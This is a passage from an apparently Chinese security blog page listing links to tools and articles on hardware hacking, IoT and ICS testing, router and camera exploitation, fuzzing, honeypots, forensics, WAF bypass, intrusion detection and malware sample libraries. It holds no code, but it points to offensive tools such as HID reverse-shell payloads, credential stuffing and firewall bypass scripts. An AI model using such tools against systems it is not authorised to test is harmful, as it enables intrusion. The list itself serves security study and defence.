信用卡信息盗取</span><br><span class="line">https://github.com/mame82/P4wnP1_aloa 在树莓派Raspberry Pi上安装常用的测试组件，打造移动测试平台</span><br><span class="line">https://www.freebuf.com/geek/195631.html 成为物理黑客吧！利用树莓派实现P4wnP1项目进行渗透测试</span><br><span class="line">https://github.com/mame82/P4wnP1 在树莓派安装网络劫持键盘注入(WHID)工具</span><br><span class="line">https://github.com/ebursztein/malusb 创建跨平台的HID欺骗payload，并在Windows和OSX上建立反向TCP-shell</span><br><span class="line">https://github.com/Orange-Cyberdefense/fenrir-ocd 主要功能和用途是绕过有线802.1x保护并使你能够访问目标网络</span><br><span class="line">https://github.com/360PegasusTeam/GhostTunnel 可在隔离环境下使用HID生成隐蔽后门，释放有效负载后删除自身</span><br><span class="line">https://github.com/LennyLeng/RadioEye RFID配合常见的NFC使用</span><br><span class="line">https://github.com/Proxmark/proxmark3/ RFID神器PM3</span><br><span class="line">http://www.freebuf.com/news/others/605.html RFID Hacking–资源大合集</span><br><span class="line">https://github.com/UnicornTeam/HackCube-Special 独角兽实验室硬件渗透测试平台</span><br></pre></td></tr></table></figure><h2 id="IoT安全"><a href="#IoT安全" class="headerlink" title="IoT安全"></a><strong>IoT安全</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/w3h/icsmaster 整合工控安全资源</span><br><span class="line">https://github.com/V33RU/IoTSecurity101 IoT工控安全与物联网安全学习的一些文章和资源</span><br><span class="line">http://www.freebuf.com/ics-articles 工控相关</span><br><span class="line">http://www.freebuf.com/sectool/174567.html 工业控制系统（ICS）安全专家必备的测试工具和安全资源</span><br><span class="line">http://www.freebuf.com/articles/ics-articles/178822.html 浅析煤炭企业如何进行工控安全建设</span><br><span class="line">http://www.freebuf.com/articles/network/178251.html 工控安全现场实施经验谈之工控系统如何加强主机防护</span><br><span class="line">https://github.com/hslatman/awesome-industrial-control-system-security 工控系统安全方向优秀资源收集仓库</span><br><span class="line">https://github.com/adi0x90/attifyos IoT集成安全测试系统，带有一些常用的软件</span><br><span class="line">https://github.com/moki-ics/moki 一键配置类似kali的工控渗透测试系统的脚本，</span><br><span class="line">https://gitlab.com/expliot_framework/expliot py3，工控安全漏洞测试框架</span><br><span class="line">https://github.com/dark-lbp/isf py2,工控中类似msf的测试框架</span><br><span class="line">https://github.com/enddo/smod py2，使用了scapy模块，主要针对modbus协议测试</span><br><span class="line">https://github.com/shodan-labs/iotdb nmap配合shodan API扫描IoT设备</span><br><span class="line">https://github.com/XHermitOne/icscanner 带界面的ics扫描器</span><br><span class="line">https://github.com/yanlinlin82/plcscan 通过TCP/102和TCP/502识别互联网上PLC设备和其他Modbus设备</span><br><span class="line">https://github.com/nsacyber/GRASSMARLIN NSA旗下ICS/SCADA态势感知</span><br><span class="line">https://github.com/nezza/scada-stuff 对 SCADA/ICS设备进行逆向与攻击</span><br></pre></td></tr></table></figure><h2 id="摄像头安全"><a href="#摄像头安全" class="headerlink" title="摄像头安全"></a><strong>摄像头安全</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/woj-ciech/kamerka 配合shodan API扫描到的摄像头地理位置显示在地图上</span><br><span class="line">https://github.com/Ullaakut/cameradar GO,针对摄像头RTSP协议渗透测试，附弱口令字典</span><br><span class="line">https://github.com/Ullaakut/camerattack GO,摄像头远程禁用</span><br><span class="line">https://github.com/NIteshx2/UltimateSecurityCam py3，摄像头监测外来人员软件，有防欺骗设置</span><br></pre></td></tr></table></figure><h2 id="路由安全"><a href="#路由安全" class="headerlink" title="路由安全"></a><strong>路由安全</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://stascorp.com RouterScan毛子开发的路由器漏洞利用工具，界面化很强大</span><br><span class="line">https://github.com/threat9/routersploit py3，仿msf路由器漏洞利用框架</span><br><span class="line">https://github.com/jh00nbr/Routerhunter-2.0 已停止更新，路由器漏洞扫描利用</span><br><span class="line">https://github.com/googleinurl/RouterHunterBR php，路由器设备漏洞扫描利用</span><br><span class="line">https://github.com/scu-igroup/telnet-scanner Telnet服务密码撞库</span><br></pre></td></tr></table></figure><h2 id="物联网安全"><a href="#物联网安全" class="headerlink" title="物联网安全"></a><strong>物联网安全</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/RUB-NDS/PRET 打印机攻击框架https://github.com/rapid7/IoTSeeker 物联网设备默认密码扫描检测工具https://github.com/schutzwerk/CANalyzat0r 专有汽车协议的安全分析工具包https://github.com/pasta-auto 智能汽车测试</span><br></pre></td></tr></table></figure><h2 id="Fuzz模糊测试漏洞挖掘"><a href="#Fuzz模糊测试漏洞挖掘" class="headerlink" title="Fuzz模糊测试漏洞挖掘"></a><strong>Fuzz模糊测试漏洞挖掘</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/articles/rookie/169413.html 一系列用于Fuzzing学习的资源汇总</span><br><span class="line">https://github.com/secfigo/Awesome-Fuzzing Fuzz相关学习资料</span><br><span class="line">https://github.com/fuzzdb-project/fuzzdb fuzz资料数据库</span><br><span class="line">https://github.com/ivanfratric/winafl AFL for fuzzing Windows binaries,原创技术分析 | AFL漏洞挖掘技术漫谈</span><br><span class="line">https://github.com/attekett/NodeFuzz a fuzzer harness for web browsers and browser like applications.</span><br><span class="line">https://github.com/google/oss-fuzz Continuous Fuzzing for Open Source Software</span><br><span class="line">http://blog.topsec.com.cn/ad_lab/alphafuzzer/ 以文件格式为主的漏洞挖掘工具</span><br><span class="line">https://bbs.ichunqiu.com/thread-24898-1-1.html Test404 -HTTP Fuzzer V3.0</span><br><span class="line">https://github.com/xmendez/wfuzz py，Web安全模糊测试工具，模块化可处理burp所抓请求和响应报文</span><br><span class="line">https://github.com/1N3/BlackWidow 基于 Python 实现的 Web 爬虫，用于收集目标网站的情报信息并对 OWASP 漏洞进行模糊测试</span><br><span class="line">https://github.com/bunzen/pySSDeep py，一个基于模糊哈希（Fuzzy Hashing）算法的工具。go，glaslos/ssdeep；C，ssdeep-project/ssdeep</span><br><span class="line">https://github.com/googleprojectzero/winafl AFL针对Windows二进制进行测试</span><br></pre></td></tr></table></figure><h2 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a><strong>安全防护</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/baidu/AdvBox Advbox是支持多种深度学习平台的AI模型安全工具箱，既支持白盒和黑盒算法生成对抗样本，衡量AI模型鲁棒性，也支持常见的防御算法</span><br><span class="line">https://github.com/quoscient/octopus 区块链智能合约安全分析工具</span><br><span class="line">https://github.com/Cyb3rWard0g/HELK 具有高级分析功能的威胁狩猎 ELK</span><br><span class="line">https://github.com/trimstray/otseca linux系统审计工具，可以导出系统配置，生成报表</span><br><span class="line">https://github.com/BugScanTeam/DNSLog 一款基于django监控 DNS 解析记录和 HTTP 访问记录的工具，可以配合盲注、xss、解析对方真实ip使用</span><br><span class="line">https://github.com/mwrlabs/dref DNS 重绑定利用框架</span><br><span class="line">https://github.com/chengr28/Pcap_DNSProxy/blob/master/README.zh-Hans.md Pcap_DNSProxy 是一个基于 WinPcap/LibPcap 用于过滤 DNS 投毒污染的工具</span><br><span class="line">https://github.com/PlagueScanner/PlagueScanner 使用python实现的集成ClamAV、ESET、Bitdefender的反病毒引擎</span><br><span class="line">https://github.com/m4rco-/dorothy2 一款木马、僵尸网络分析框架</span><br><span class="line">http://github.com/jumpserver/jumpserver 基于 Python3 的开源堡垒机</span><br><span class="line">https://github.com/github/glb-director 负载均衡组件GLB，数据解析使用了dpdk</span><br><span class="line">https://github.com/processhacker/processhacker 监控系统资源、软件调试、检测恶意软件，管理进程</span><br><span class="line">https://github.com/TKCERT/mail-security-tester 检测邮件防护与过滤系统的测试框架</span><br><span class="line">https://github.com/chaitin/sqlchop-http-proxy 利用HTTP 反向代理，内置 SQLChop 作为 SQL 注入攻击检测模块，可以拦截 SQL 注入流量而放行正常流量</span><br><span class="line">https://github.com/OWASP/SecureTea-Project 当有人私自触碰电脑鼠标或触摸板，进行报警</span><br></pre></td></tr></table></figure><h2 id="代码审计应用测试"><a href="#代码审计应用测试" class="headerlink" title="代码审计应用测试"></a><strong>代码审计应用测试</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https://www.waitalone.cn/seay-source-code-auditv2.html Seay源代码审计系统2.1版本</span><br><span class="line">https://github.com/pyupio/safety 检查所有已安装 Python 包, 查找已知的安全漏洞</span><br><span class="line">https://github.com/pumasecurity/puma-scan 实时代码审计，vs插件</span><br><span class="line">https://github.com/wufeifei/cobra 白盒代码安全审计系统</span><br><span class="line">https://github.com/OneSourceCat/phpvulhunter 静态php代码审计</span><br><span class="line">https://github.com/ripsscanner/rips 基于php的php代码审计工具</span><br><span class="line">https://github.com/Qihoo360/phptrace 跟踪、分析PHP运行情况的工具</span><br><span class="line">https://github.com/ajinabraham/NodeJsScan Node.JS应用代码审计</span><br><span class="line">https://github.com/ctxis/beemka 针对Electron App的漏洞利用工具包</span><br><span class="line">https://github.com/doyensec/electronegativity Electron应用代码审计，App的错误配置和安全问题</span><br><span class="line">https://github.com/shengqi158/pyvulhunter Python应用审计</span><br><span class="line">https://github.com/securego/gosec Go 语言源码安全分析工具</span><br><span class="line">https://github.com/GoSSIP-SJTU/TripleDoggy 基于clang的c/c++/object-c源代码检测框架，有大量接口可以被调用</span><br><span class="line">https://github.com/ga0/pyprotect 给python代码加密，防止逆向</span><br><span class="line">https://github.com/presidentbeef/brakeman Ruby on Rails应用静态代码分析</span><br><span class="line">https://github.com/python-security/pyt 用于检测Python Web应用程序中的安全漏洞的静态分析工具</span><br><span class="line">https://github.com/m4ll0k/WPSploit WordPress插件代码安全审计</span><br><span class="line">https://github.com/elcodigok/wphardening 加强任何WordPress安装的安全</span><br></pre></td></tr></table></figure><h2 id="大数据平台安全"><a href="#大数据平台安全" class="headerlink" title="大数据平台安全"></a><strong>大数据平台安全</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shouc/BDA 针对hadoop/spark/mysql等大数据平台的审计与检测</span><br><span class="line">https://github.com/wavestone-cdt/hadoop-attack-library hadoop测试方式和工具集</span><br></pre></td></tr></table></figure><h2 id="蜜罐安全"><a href="#蜜罐安全" class="headerlink" title="蜜罐安全"></a><strong>蜜罐安全</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/paralax/awesome-honeypots 蜜罐开源技术收集</span><br><span class="line">https://github.com/threatstream/mhn 现代蜜网，集成了多种蜜罐的安装脚本，可以快速部署、使用，也能够快速的从节点收集数据</span><br><span class="line">https://github.com/dtag-dev-sec/tpotce T-POT，里面使用docker技术实现多个蜜罐组合，配合ELK进行研究与数据捕获</span><br><span class="line">https://www.freebuf.com/sectool/190840.html T-Pot多蜜罐平台使用心法</span><br><span class="line">https://github.com/n3uz/t-pot-autoinstall 将fork的T-POT蜜罐的一键安装脚本替换为国内加速镜像</span><br></pre></td></tr></table></figure><h2 id="Web蜜罐内网监测"><a href="#Web蜜罐内网监测" class="headerlink" title="Web蜜罐内网监测"></a><strong>Web蜜罐内网监测</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/micheloosterhof/cowrie py2，使用ELK（ElasticSearch，LogStash，Kibana）进行数据分析，目前支持ssh，telnet，sftp等协议</span><br><span class="line">https://github.com/mushorg/snare py3，web安全蜜罐，可克隆指定Web页面</span><br><span class="line">https://github.com/honeynet/beeswarm py，使用agent探针与蜜罐进行实时交互来引诱攻击者</span><br><span class="line">https://github.com/thinkst/opencanary PY2,SNMP\RDP\SAMBA蜜罐</span><br><span class="line">https://github.com/p1r06u3/opencanary_web PY,TORNADO,内网低交互蜜罐。支持自动化安装，目前支持常见的16中协议，现为探针/蜜罐-管理的架构，可以考虑二次开发为探针-沙盒-管理的架构</span><br><span class="line">https://github.com/p1r06u3/opencanary_webhttps://github.com/Cymmetria 知名欺骗防御蜜罐组织。Struct、weblogic、telnet、Cisco ASA、Micros等仿真蜜罐</span><br><span class="line">https://github.com/Cymmetria/honeycomb Cymmetria公司开源蜜罐框架，低交互</span><br><span class="line">https://github.com/honeytrap/honeytrap 可扩展蜜罐框架，支持探针部署与高交互蜜罐</span><br><span class="line">https://gosecure.net/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/ RDP MITM，打造可记录图像和按键的 RDP 蜜罐（https://github.com/gosecure/pyrdp）</span><br></pre></td></tr></table></figure><h2 id="摄像头蜜罐"><a href="#摄像头蜜罐" class="headerlink" title="摄像头蜜罐"></a><strong>摄像头蜜罐</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/alexbredo/honeypot-camera py，摄像头蜜罐。tornado模拟WEB服务，图片代替视频，可以考虑后期多加点图片和按钮</span><br><span class="line">https://github.com/EasyDarwin/EasyIPCamera C，RTSP服务器组件用以构建摄像头蜜罐</span><br></pre></td></tr></table></figure><h2 id="工控蜜罐"><a href="#工控蜜罐" class="headerlink" title="工控蜜罐"></a><strong>工控蜜罐</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sjhilt/GasPot 模拟油电燃气工控系统</span><br><span class="line">https://github.com/djformby/GRFICS IoT工业仿真系统模拟框架，采用MODBUS协议对PLC虚拟机监视和控制</span><br><span class="line">https://github.com/RabitW/IoTSecurityNAT IoT测试系统，方便快速接入各种设备，进行安全测试</span><br><span class="line">https://github.com/mushorg/conpot 针对ICS/SCADA的低交互工控蜜罐，模拟Modbus和S7comm</span><br></pre></td></tr></table></figure><h2 id="逆向相关"><a href="#逆向相关" class="headerlink" title="逆向相关"></a><strong>逆向相关</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://www.peerlyst.com/posts/resource-learning-how-to-reverse-malware-a-guide 恶意软件逆向指南和工具的集合</span><br><span class="line">https://github.com/ReFirmLabs/binwalk 二进制pwn文件自动化逆向，拥有多种插件</span><br><span class="line">https://github.com/angr/angr 一个具有动态符号执行和静态分析的二进制分析工具</span><br><span class="line">https://github.com/endgameinc/xori 自定义反汇编框架</span><br><span class="line">https://down.52pojie.cn/ 吾爱破解爱盘工具包</span><br><span class="line">https://github.com/blacknbunny/peanalyzer32 PE 文件分析和反汇编工具</span><br><span class="line">https://github.com/DominicBreuker/pspy 不用root权限就可以监控进程运行</span><br></pre></td></tr></table></figure><h2 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a><strong>CTF相关</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https://ctf-wiki.github.io/ctf-wiki/ CTFwiki，Misc/Crypto/Web/Assembly/Executable/Reverse/Pwn/Android/ICS</span><br><span class="line">https://github.com/adon90/pentest_compilation ctf比赛与OSCP考试中常见的知识点和命令</span><br><span class="line">https://github.com/gabemarshall/microctfs 小型ctf镜像docker</span><br><span class="line">https://github.com/giantbranch/pwn_deploy_chroot 部署多个pwn题到一个docker容器中</span><br><span class="line">https://github.com/facebook/fbctf CTF比赛框架</span><br><span class="line">https://github.com/0Chencc/CTFCrackTools CTF工具集成包</span><br><span class="line">https://github.com/guyoung/CaptfEncoder CTF密码编码全家桶，还有小程序版本</span><br><span class="line">https://github.com/Gallopsled/pwntools pwn类型，二进制利用框架</span><br><span class="line">https://github.com/ChrisTheCoolHut/Zeratool pwn类型，二进制利用框架</span><br><span class="line">https://github.com/ChrisTheCoolHut/Rocket-Shot pwn，自动攻击脚本</span><br><span class="line">https://0xrick.github.io/lists/stego/ 隐写术工具集，Steganography - A list of useful tools and resources</span><br><span class="line">https://github.com/DominicBreuker/stego-toolkit 隐写工具包</span><br><span class="line">https://github.com/bugsafe/WeReport WeReport报告助手</span><br><span class="line">https://github.com/PELock/CrackMeZ3S-CTF-CrackMe-Tutorial 为CTF比赛编写CrackMe软件</span><br></pre></td></tr></table></figure><h2 id="计算机与移动设备取证调查"><a href="#计算机与移动设备取证调查" class="headerlink" title="计算机与移动设备取证调查"></a><strong>计算机与移动设备取证调查</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/rookie/195107.html 记一次微信数据库解密过程。微信的加密数据库的解密密码是由“设备的IMEI(MEID)+用户的uin，进行MD5，然后取其前7位小写字母”构成的</span><br><span class="line">https://www.audacityteam.org/ 音频文件和波形图处理工具</span><br><span class="line">http://www.sweetscape.com/010editor/ 识别不同文件格式（模板）的16进制编辑器，具有文件修复功能</span><br><span class="line">http://www.magicexif.com/ 将照片图像中的exif信息数据化</span><br><span class="line">http://mediaarea.net/MediaInfo 类似exiftool来查看内容区域和元数据信息</span><br><span class="line">https://www.sno.phy.queensu.ca/~phil/exiftool/ 检查图像文件的exif元数据</span><br><span class="line">https://www.gimp.org/ Gimp提供了转换各类图像文件可视化数据的功能，还可以用于确认文件是否是一个图像文件</span><br><span class="line">https://github.com/volatilityfoundation/volatility windows内存取证分析</span><br><span class="line">https://github.com/gleeda/memtriage Windows内存取证分析</span><br><span class="line">https://github.com/SekoiaLab/Fastir_Collector Windows取证/信息收集，不限于内存，注册表，文件信息等</span><br><span class="line">https://github.com/Viralmaniar/Remote-Desktop-Caching- RDP信息复原，png图片格式</span><br><span class="line">https://github.com/comaeio/LiveCloudKd C，针对Hyper-V的内存取证</span><br><span class="line">-https://github.com/sevagas/swap_digger 针对 Linux swap 进行取证分析的工具</span><br><span class="line">http://extundelete.sourceforge.net/ linux下的文件恢复</span><br><span class="line">https://github.com/viaforensics/android-forensics 安卓取证App和框架，可以对安卓设备内各种信息进行提取</span><br><span class="line">https://github.com/davidmcgrew/joy 用来捕获和分析内外网流量数据的包，主要用于进行网络调查、安全监控和取证</span><br><span class="line">https://github.com/USArmyResearchLab/Dshell 可扩展的网络取证分析框架，支持快速开发插件与解析网络数据包捕获</span><br><span class="line">http://qpdf.sourceforge.net/ 查看pdf文件并整理提取信息</span><br><span class="line">http://zipinfo.com/ 在无需提取的情况下列出了zip文件的内容信息</span><br><span class="line">http://f00l.de/pcapfix/ pcap文件修复</span><br><span class="line">https://www.cgsecurity.org/wiki/TestDisk 磁盘分区修复</span><br><span class="line">https://github.com/decalage2/oletools py，用于分析MS OLE2文件（结构化存储，复合文件二进制格式）和MS Office文档</span><br><span class="line">https://www.xplico.org/download 内存取证</span><br><span class="line">https://github.com/google/bochspwn-reloaded Bochspwn Reloaded（内核信息泄漏检测）工具</span><br><span class="line">https://github.com/abrignoni/DFIR-SQL-Query-Repo 收集用于数据取证的SQL查询模板</span><br><span class="line">https://www.freebuf.com/news/193684.html iOS取证技巧：在无损的情况下完整导出SQLite数据库</span><br></pre></td></tr></table></figure><h2 id="移动安全"><a href="#移动安全" class="headerlink" title="移动安全"></a><strong>移动安全</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Brucetg/App_Security App安全学习资源</span><br><span class="line">https://github.com/rovo89/Xposed 随心所欲修改安卓手机系统</span><br><span class="line">https://github.com/android-hacker/VirtualXposed 基于VirtualApp 和 epic 在非ROOT环境下运行Xposed模块的实现</span><br><span class="line">https://github.com/MobSF/Mobile-Security-Framework-MobSF 移动安全审计框架。android、ios、win</span><br><span class="line">https://github.com/WooyunDota/DroidSSLUnpinning 安卓证书锁定解除的工具</span><br><span class="line">https://github.com/nccgroup/house 运行时手机 App 分析工具包, 带Web GUI</span><br><span class="line">https://github.com/UltimateHackers/Diggy 从 Apk 文件中提取 URLs 的工具</span><br><span class="line">https://github.com/nettitude/scrounger iOS和Android移动应用程序渗透测试框架</span><br><span class="line">https://github.com/XekriCorp/LeakVM 安卓应用安全测试框架</span><br><span class="line">https://github.com/zsdlove/ApkVulCheck 安卓漏洞扫描工具</span><br><span class="line">https://github.com/samyk/frisky 针对 ios/macOS 应用的嗅探/修改/逆向/注入等工具</span><br><span class="line">https://github.com/GeoSn0w/OsirisJailbreak12 IOS12不完全越狱</span><br><span class="line">https://github.com/chaitin/passionfruit iOS应用逆向与分析工具，可以大大加速iOS应用安全分析过程</span><br></pre></td></tr></table></figure><h2 id="防火墙规则、Waf、CDN相关"><a href="#防火墙规则、Waf、CDN相关" class="headerlink" title="防火墙规则、Waf、CDN相关"></a><strong>防火墙规则、Waf、CDN相关</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/baidu/openrasp RASP,Runtime Application Self-Protection，实时应用自我保护，更智能，针对每个语言定制</span><br><span class="line">https://github.com/snort3/snort3 snort算是最出名的开源ids入侵检测</span><br><span class="line">https://github.com/chaitin/yanshi 长亭偃师（yanshi）,雷池（SafeLine）防火墙核心引擎使用到的代码生成工具</span><br><span class="line">https://github.com/SpiderLabs/ModSecurity C，跨平台 WAF engine for Apache, IIS and Nginx</span><br><span class="line">https://github.com/klaubert/waf-fle ModSecurity Web控制台</span><br><span class="line">https://github.com/xsec-lab/x-waf 适用于中小企业的云waf</span><br><span class="line">https://github.com/jx-sec/jxwaf 基于openrestynginx+lua开发，独创的业务逻辑防护引擎和机器学习引擎，解决传统WAF无法对业务安全进行防护的痛点</span><br><span class="line">https://github.com/loveshell/ngx_lua_waf 基于lua-nginx-moduleopenresty的web应用防火墙</span><br><span class="line">https://github.com/Janusec/janusec 基于Golang开发的应用安全网关，具备WAF、CC攻击防御、证书私钥加密、负载均衡、统一Web化管理等功能。</span><br><span class="line">https://github.com/SpiderLabs/owasp-modsecurity-crs a set of generic attack detection rules for use with ModSecurity or compatible web application firewalls</span><br><span class="line">https://github.com/kirillwow/ids_bypass IDS Bypass 脚本</span><br><span class="line">https://github.com/milo2012/ipv4bypass 利用ipV6地址绕过waf</span><br><span class="line">https://github.com/3xp10it/bypass_waf 防火墙绕过脚本</span><br><span class="line">https://github.com/m0rtem/CloudFail 针对Cloudfail,查找位于CDN后面网站的真实IP</span><br><span class="line">https://github.com/Nitr4x/whichCDN CDN识别、检测</span><br><span class="line">https://github.com/3xp10it/xcdn 尝试找出cdn背后的真实ip，3xp10it.github.io 博客</span><br></pre></td></tr></table></figure><h2 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a><strong>入侵检测</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Neo23x0/Loki 一款APT入侵痕迹扫描器</span><br><span class="line">https://github.com/ossec/ossec-hids 开源hids堡垒机</span><br><span class="line">https://github.com/grayddq/HIDS hids基于主机型入侵检测系统，一个人的安全部</span><br><span class="line">https://github.com/ysrc/yulong-hids 驭龙HIDS是一款由 YSRC 开源的入侵检测系统</span><br><span class="line">https://github.com/DianrongSecurity/AgentSmith-HIDS 点融开源HIDS，开源部分为主机情报收集工具</span><br><span class="line">https://github.com/Tencent/HaboMalHunter 哈勃分析系统，linux系统病毒分析及安全测试</span><br><span class="line">https://github.com/JPCERTCC/LogonTracer 根据win登陆记录日志来分析并用图形化展示恶意登陆行为</span><br><span class="line">https://github.com/anwi-wips/anwi 无线IDS, 基于低成本的Wi-Fi模块(ESP8266)</span><br><span class="line">https://github.com/Security-Onion-Solutions/security-onion 基于ubuntu用于入侵检测，网络安全监控和日志管理，采用分布式架构</span><br><span class="line">https://github.com/jpcertcc/sysmonsearch 将Sysmon的日志结果可视化</span><br><span class="line">http://m.imooc.com/article/21236 快速自检电脑是否被黑客入侵过(Windows版)</span><br><span class="line">http://www.freebuf.com/articles/system/157597.html 快速自检电脑是否被黑客入侵过（Linux版）</span><br><span class="line">http://www.freebuf.com/rookie/179638.html 服务器入侵溯源小技巧整理</span><br><span class="line">https://github.com/zhanghaoyil/Hawk-I 基于无监督机器学习算法从Web日志中自动提取攻击Payload</span><br></pre></td></tr></table></figure><h2 id="恶意文件测与样本分析"><a href="#恶意文件测与样本分析" class="headerlink" title="恶意文件测与样本分析"></a><strong>恶意文件测与样本分析</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/open-power-workgroup/Hospital 全国莆田系医院名单</span><br><span class="line">https://github.com/chenerlich/FCL 恶意代码使用的命令行收集</span><br><span class="line">https://paper.seebug.org/421 常见软件合集与恶意软件分析</span><br><span class="line">https://github.com/sapphirex00/Threat-Hunting apt恶意软件样本</span><br><span class="line">https://www.malware-traffic-analysis.net/ 恶意软件样本</span><br><span class="line">http://dasmalwerk.eu/ 恶意软件样本</span><br><span class="line">https://github.com/ytisf/theZoo 恶意软件样本</span><br><span class="line">https://github.com/mstfknn/malware-sample-library 恶意软件样本</span><br><span class="line">http://99.248.235.4/Library/ 恶意软件样本库。ladder</span><br><span 